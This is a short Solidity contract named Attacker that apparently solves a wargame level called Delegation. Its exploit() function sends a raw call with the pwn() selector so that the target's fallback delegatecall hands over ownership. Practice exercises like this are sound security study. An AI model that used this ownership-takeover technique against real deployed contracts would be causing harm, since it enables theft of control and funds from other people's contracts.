// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;
import "@levels/Delegation.sol";

contract Attacker {
    Delegation public target;

    constructor(address _target) payable {
        target = Delegation(_target);
    }

    receive() external payable {}

    function exploit() public payable {
        address(target).call(abi.encodeWithSignature("pwn()"));
    }
}
